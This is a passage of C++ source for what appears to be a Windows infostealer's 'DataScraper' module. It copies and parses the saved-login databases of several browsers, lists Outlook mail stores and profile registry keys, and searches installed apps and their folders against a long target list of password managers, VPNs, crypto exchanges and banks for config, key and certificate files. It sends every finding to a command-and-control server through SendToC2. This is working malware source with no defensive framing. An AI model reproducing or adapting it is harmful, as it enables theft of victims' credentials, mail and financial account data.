    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    
    std::vector<std::string> browserPaths = {
        localAppData + std::string("\\Google\\Chrome\\User Data\\Default\\Login Data"),
        localAppData + std::string("\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
        localAppData + std::string("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"),
        localAppData + std::string("\\Opera Software\\Opera Stable\\Login Data"),
        localAppData + std::string("\\Vivaldi\\User Data\\Default\\Login Data"),
        localAppData + std::string("\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data")
    };
    
    for (const auto& loginDataPath : browserPaths) {
        if (!m_running) break;
        if (!fs::exists(loginDataPath)) continue;
        
        try {
            // Copy the file first (SQLite may be locked)
            std::string tempCopy = loginDataPath + ".tmp";
            CopyFileA(loginDataPath.c_str(), tempCopy.c_str(), FALSE);
            
            std::ifstream file(tempCopy, std::ios::binary);
            if (!file.is_open()) continue;
            
            std::vector<char> buffer(1024 * 1024);
            file.read(buffer.data(), buffer.size());
            std::streamsize bytesRead = file.gcount();
            file.close();
            
            // Cleanup temp
            DeleteFileA(tempCopy.c_str());
            
            if (bytesRead <= 0) continue;
            
            std::string content(buffer.data(), bytesRead);
            
            // Look for URL patterns and credentials in the SQLite database dump
            std::regex urlRegex("https?://[^\\s\"]+");
            std::regex userRegex("(?:username|email|login|user)\\s*[:=]\\s*([^\\s\",;]+)");
            
            std::smatch match;
            std::string::const_iterator searchStart(content.cbegin());
            while (std::regex_search(searchStart, content.cend(), match, urlRegex)) {
                std::string url = match[0].str();
                if (url.find(".com") != std::string::npos || url.find(".org") != std::string::npos) {
                    std::string data = "{\"type\":\"browser_login_url\",\"url\":\"" + 
                                       escapeJson(url) + "\",\"source\":\"" + 
                                       escapeJson(loginDataPath) + "\"}";
                    SendToC2("found", data);
                    m_itemsFound++;
                }
                searchStart = match.suffix().first;
            }
        } catch (...) {}
    }
}

void DataScraper::ScanOutlookProfiles() {
    std::cout << "[DATASCRAPER] Scanning Outlook profiles...\n";
    char localAppData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    
    std::vector<std::string> outlookPaths = {
        localAppData + std::string("\\Microsoft\\Outlook\\"),
        localAppData + std::string("\\Microsoft\\Office\\16.0\\Outlook\\"),
        localAppData + std::string("\\Microsoft\\Office\\15.0\\Outlook\\"),
        localAppData + std::string("\\Microsoft\\Office\\14.0\\Outlook\\")
    };
    
    for (const auto& outlookPath : outlookPaths) {
        if (!m_running) break;
        if (!fs::exists(outlookPath)) continue;
        
        try {
            for (const auto& entry : fs::directory_iterator(outlookPath)) {
                if (!m_running) break;
                if (!entry.is_regular_file()) continue;
                
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                
                // Outlook data files
                if (ext == ".pst" || ext == ".ost" || ext == ".nst" || ext == ".oab") {
                    std::string data = "{\"type\":\"outlook_file\",\"path\":\"" + 
                                       escapeJson(entry.path().string()) + "\",\"size\":\"" + 
                                       std::to_string(fs::file_size(entry.path())) + "\"}";
                    SendToC2("found", data);
                    m_itemsFound++;
                }
            }
        } catch (...) {}
    }
    
    // Also check registry for Outlook profiles
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char valueName[256];
        DWORD valueNameSize;
        BYTE valueData[4096];
        DWORD valueDataSize;
        DWORD type;
        int index = 0;
        
        while (RegEnumValueA(hKey, index, valueName, &valueNameSize, nullptr, &type, valueData, &valueDataSize) == ERROR_SUCCESS) {
            if (type == REG_SZ || type == REG_BINARY) {
                std::string data = "{\"type\":\"outlook_registry\",\"name\":\"" + 
                                   escapeJson(std::string(valueName, valueNameSize)) + "\"}";
                SendToC2("found", data);
                m_itemsFound++;
            }
            index++;
            valueNameSize = sizeof(valueName);
            valueDataSize = sizeof(valueData);
        }
        RegCloseKey(hKey);
    }
}

void DataScraper::ScanInstalledApps() {
    std::cout << "[DATASCRAPER] Scanning installed applications...\n";
    
    // Scan for installed apps that may contain credentials
    HKEY hKey;
    const std::vector<std::pair<std::string, std::string>> appRegPaths = {
        {"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "HKLM"},
        {"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "HKLM"},
        {"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "HKCU"}
    };
    
    std::vector<std::string> credentialApps = {
        "discord", "steam", "telegram", "filezilla", "slack", "signal",
        "whatsapp", "thunderbird", "outlook", "foxmail", "eudora",
        "opera", "chrome", "firefox", "edge", "brave", "vivaldi",
        "yandex", "torch", "cent", "maxthon", "slimjet", "comodo",
        "putty", "winscp", "mobaxt", "teamviewer", "anydesk",
        "vnc", "rdp", "openvpn", "nordvpn", "expressvpn", "protonvpn",
        "windscribe", "surfshark", "mullvad", "wireguard",
        "1password", "bitwarden", "lastpass", "dashlane", "keeper",
        "keepass", "enpass", "roboform", "nordpass", "sticky password",
        "authy", "google authenticator", "microsoft authenticator",
        "netflix", "spotify", "hulu", "disney", "amazon prime",
        "hbomax", "paramount", "peacock", "apple tv", "crunchyroll",
        "twitch", "youtube", "reddit", "tiktok", "instagram",
        "facebook", "twitter", "linkedin", "snapchat", "pinterest",
        "uber", "lyft", "doordash", "grubhub", "postmates",
        "paypal", "venmo", "cashapp", "zelle", "stripe",
        "coinbase", "binance", "kraken", "gemini", "crypto.com",
        "robinhood", "etrade", "schwab", "fidelity", "td ameritrade",
        "webull", "sofi", "acorns", "betterment", "wealthfront"
    };
    
    for (const auto& regInfo : appRegPaths) {
        if (!m_running) break;
        
        HKEY rootKey = (regInfo.second == "HKLM") ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
        if (RegOpenKeyExA(rootKey, regInfo.first.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char subKeyName[256];
            DWORD subKeyNameSize;
            int index = 0;
            
            while (RegEnumKeyExA(hKey, index, subKeyName, &subKeyNameSize, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
                if (!m_running) break;
                
                std::string appName(subKeyName, subKeyNameSize);
                std::string lowerApp = appName;
                std::transform(lowerApp.begin(), lowerApp.end(), lowerApp.begin(), ::tolower);
                
                // Check if this is a credential-related app
                for (const auto& credApp : credentialApps) {
                    if (lowerApp.find(credApp) != std::string::npos) {
                        HKEY hSubKey;
                        std::string subKeyPath = regInfo.first + "\\" + appName;
                        if (RegOpenKeyExA(rootKey, subKeyPath.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                            char displayName[512] = {0};
                            DWORD displayNameSize = sizeof(displayName);
                            DWORD type;
                            
                            if (RegQueryValueExA(hSubKey, "DisplayName", nullptr, &type, (BYTE*)displayName, &displayNameSize) == ERROR_SUCCESS) {
                                std::string data = "{\"type\":\"installed_app\",\"name\":\"" + 
                                                   escapeJson(std::string(displayName)) + "\"}";
                                SendToC2("found", data);
                                m_itemsFound++;
                            }
                            
                            // Also check for install location
                            char installLocation[512] = {0};
                            DWORD installSize = sizeof(installLocation);
                            if (RegQueryValueExA(hSubKey, "InstallLocation", nullptr, &type, (BYTE*)installLocation, &installSize) == ERROR_SUCCESS) {
                                std::string installPath(installLocation);
                                if (!installPath.empty() && fs::exists(installPath)) {
                                    // Scan the install directory for config files
                                    try {
                                        for (const auto& file : fs::directory_iterator(installPath)) {
                                            if (!m_running) break;
                                            if (!file.is_regular_file()) continue;
                                            
                                            std::string ext = file.path().extension().string();
                                            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                                            
                                            if (ext == ".cfg" || ext == ".conf" || ext == ".config" || 
                                                ext == ".ini" || ext == ".json" || ext == ".xml" ||
                                                ext == ".dat" || ext == ".db" || ext == ".sqlite") {
                                                
                                                std::string data = "{\"type\":\"app_config\",\"app\":\"" + 
                                                                   escapeJson(std::string(displayName)) + 
                                                                   "\",\"file\":\"" + 
                                                                   escapeJson(file.path().filename().string()) + "\"}";
                                                SendToC2("found", data);
                                                m_itemsFound++;
                                            }
                                        }
                                    } catch (...) {}
                                }
                            }
                            RegCloseKey(hSubKey);
                        }
                        break;
                    }
                }
                
                index++;
                subKeyNameSize = sizeof(subKeyName);
            }
            RegCloseKey(hKey);
        }
    }
    
    // Also scan common install directories for credential-related apps
    std::vector<std::string> scanDirs = {
        std::string(getenv("PROGRAMFILES")) + "\\",
        std::string(getenv("PROGRAMFILES(X86)")) + "\\",
        std::string(getenv("LOCALAPPDATA")) + "\\",
        std::string(getenv("APPDATA")) + "\\",
        std::string(getenv("USERPROFILE")) + "\\AppData\\Local\\",
        std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\"
    };
    
    for (const auto& dir : scanDirs) {
        if (!m_running) break;
        if (!fs::exists(dir)) continue;
        
        try {
            for (const auto& entry : fs::directory_iterator(dir)) {
                if (!m_running) break;
                if (!entry.is_directory()) continue;
                
                std::string dirName = entry.path().filename().string();
                std::string lowerDir = dirName;
                std::transform(lowerDir.begin(), lowerDir.end(), lowerDir.begin(), ::tolower);
                
                for (const auto& credApp : credentialApps) {
                    if (lowerDir.find(credApp) != std::string::npos) {
                        std::string data = "{\"type\":\"app_directory\",\"name\":\"" + 
                                           escapeJson(dirName) + "\",\"path\":\"" + 
                                           escapeJson(entry.path().string()) + "\"}";
                        SendToC2("found", data);
                        m_itemsFound++;
                        
                        // Scan for config files in this directory
                        try {
                            for (const auto& file : fs::directory_iterator(entry.path())) {
                                if (!m_running) break;
                                if (!file.is_regular_file()) continue;
                                
                                std::string ext = file.path().extension().string();
                                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                                
                                if (ext == ".cfg" || ext == ".conf" || ext == ".config" || 
                                    ext == ".ini" || ext == ".json" || ext == ".xml" ||
                                    ext == ".dat" || ext == ".db" || ext == ".sqlite" ||
                                    ext == ".txt" || ext == ".log" || ext == ".key" ||
                                    ext == ".pem" || ext == ".crt" || ext == ".ovpn") {
                                    
                                    std::string data = "{\"type\":\"app_config_file\",\"app\":\"" + 
                                                       escapeJson(dirName) + "\",\"file\":\"" + 
                                                       escapeJson(file.path().filename().string()) + "\"}";
                                    SendToC2("found", data);
                                    m_itemsFound++;
                                }
                            }
                        } catch (...) {}
                        break;
                    }
                }
            }
        } catch (...) {}
    }
}
